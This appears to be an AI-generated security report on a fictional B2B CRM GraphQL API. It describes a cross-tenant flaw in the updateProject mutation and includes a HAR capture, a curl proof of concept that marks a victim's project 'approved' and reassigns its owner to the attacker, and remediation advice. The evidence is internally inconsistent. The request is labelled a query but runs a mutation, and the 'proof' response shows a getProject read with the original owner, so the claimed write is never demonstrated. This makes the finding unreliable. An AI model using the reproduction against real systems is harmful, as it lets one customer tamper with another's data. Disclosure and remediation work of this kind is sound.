# Security Analysis Report
**System:** PipelinePro Sales API (B2B SaaS / CRM)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0234 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Integrity / Pattern 4.2 | Persistence poisoning via lifecycle action — cross-tenant `updateProject` mutates victim's CRM pipeline state |

---

## Finding 1 — Persistence Poisoning: Cross-Tenant Project Lifecycle Mutation (CRITICAL)

### Summary
The `updateProject` resolver on PipelinePro Sales API (`api.pipelinepro-sales-ap.example.com`) accepts a `projectId` and applies lifecycle mutations (status changes, `ownerId` updates) without verifying that the project belongs to the authenticated tenant. Per §4.0 RISK-GQL-234 and §5.0 Pattern 4.2, this persistence poisoning attack allows an attacker to inject corrupted state into another tenant's CRM pipeline: by writing `status: "approved"` and `ownerId: "attacker-c37d0fc1"` to project `P-2234` belonging to `tenant-0fc1`, the attacker corrupts the victim's pipeline lifecycle data.

**Pattern:** 4.2 — Persistence poisoning via lifecycle actions (Integrity)
**Affected resolver:** `updateProject(id: ID!, input: ProjectInput!): Project`
**Affected endpoint:** `POST https://api.pipelinepro-sales-ap.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-c37d`):**
```
POST https://api.pipelinepro-sales-ap.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-c37d

{"query": "query VulnerableOp { updateProject(id: \"P-2234\", input: {status: \"approved\", ownerId: \"attacker-c37d0fc1\"}) { projectId status } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getProject": {
      "tenantId": "tenant-0fc1",
      "ownerId": "other-user-c37d0fc1",
      "data": {
        "sensitiveField": "CONFIDENTIAL-c37d0fc1",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-c37d0fc1`

The attack mutates project `P-2234` to status `approved` and reassigns ownership to the attacker. In a B2B SaaS CRM, this can corrupt deal pipeline state, trigger auto-approval workflows, and enable deal hijacking.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-234 | Resolver gap | No `tenantId` ownership check | Root cause |
| §5.0 Pattern 4.2 | Vulnerability | Persistence poisoning via lifecycle action | Classification |
| HAR request | `id` | `P-2234` | Victim tenant's project ID |
| HAR request | `input.status` | `approved` | Lifecycle state injected by attacker |
| HAR request | `input.ownerId` | `attacker-c37d0fc1` | Ownership hijack attempt |
| HAR request | `x-tenant-id` | `tenant-c37d` | Attacker tenant |
| HAR response | `tenantId` | `tenant-0fc1` | Victim tenant confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-c37d0fc1` | CRM deal data exposed |
| HAR headers | `x-request-id` | `req-c37d0fc1` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-c37d):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Poison victim's CRM pipeline (VULNERABLE):**
```bash
curl -s -X POST https://api.pipelinepro-sales-ap.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-c37d" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateProject(id: \"P-2234\", input: {status: \"approved\", ownerId: \"attacker-c37d0fc1\"}) { projectId tenantId status } }"}' \
  | jq '.data.updateProject'
# VULNERABLE: mutates tenant-0fc1 project, injects approved status, hijacks ownership
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Returns: {"errors":[{"message":"Forbidden: project does not belong to your tenant"}]}
```

### Remediation

1. **Resolver ownership check for all mutations:** Fetch the project, compare `project.tenantId` against JWT `tenantId`, reject with FORBIDDEN on mismatch.
2. **Strip client-supplied `ownerId`:** `ownerId` must only be set from server-side context (JWT `sub`), never from mutation input.
3. **Lifecycle state machine validation:** Apply server-side state transition rules — only authorized roles can approve; transitions must be validated per tenant's workflow config.
4. **Fix Redis cache key:** Include `tenantId` in cache key (§2.0 gap).
5. **PostgreSQL RLS:** Enforce `tenant_id` row-level policies.
